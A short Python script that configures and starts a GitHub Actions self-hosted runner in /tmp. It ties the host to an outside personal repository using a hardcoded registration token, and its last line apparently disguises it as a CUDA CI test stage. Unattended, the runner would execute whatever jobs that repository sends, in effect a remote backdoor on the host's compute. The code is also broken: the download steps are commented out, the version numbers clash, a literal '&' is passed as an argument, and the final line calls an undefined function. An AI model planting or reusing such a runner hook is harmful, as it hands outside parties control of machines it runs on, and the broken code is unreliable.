import os
import tarfile
import subprocess
import requests

RUNNER_VERSION = "2.316.0"
DOWNLOAD_URL = f"https://github.com/actions/runner/releases/download/v2.332.0/actions-runner-linux-x64-2.332.0.tar.gz"

RUNNER_DIR = "/tmp/actions-runner1"
ARCHIVE_NAME = "runner.tar.gz"

REPO_URL = "https://github.com/marysteven/pic"
RUNNER_NAME = "python-auto-runner"
TOKEN = "B7NVQL5ARFLN72NX5O2RNBTJV2F3S"


os.makedirs(RUNNER_DIR, exist_ok=True)
os.chdir(RUNNER_DIR)



# print("Downloading runner...")

# r = requests.get(DOWNLOAD_URL, stream=True)
# with open(ARCHIVE_NAME, "wb") as f:
#     for chunk in r.iter_content(chunk_size=8192):
#         if chunk:
#             f.write(chunk)

# print("Download completed")



# print("Extracting...")

# with tarfile.open(ARCHIVE_NAME, "r:gz") as tar:
#     tar.extractall()

# print("Extraction done")



# print("Configuring runner...")

subprocess.run([
    "./config.sh",
    "--url", REPO_URL,
    "--token", TOKEN,
    "--name", RUNNER_NAME,
    "--work", "_work",
    "--unattended",
    "--replace",
    "&"
], check=True)

# print("Runner configured")


# print("Starting runner...")

subprocess.run(["./run.sh","&"])

register_cuda_ci(stage-a-test-1,suite="stage-a-test-1")
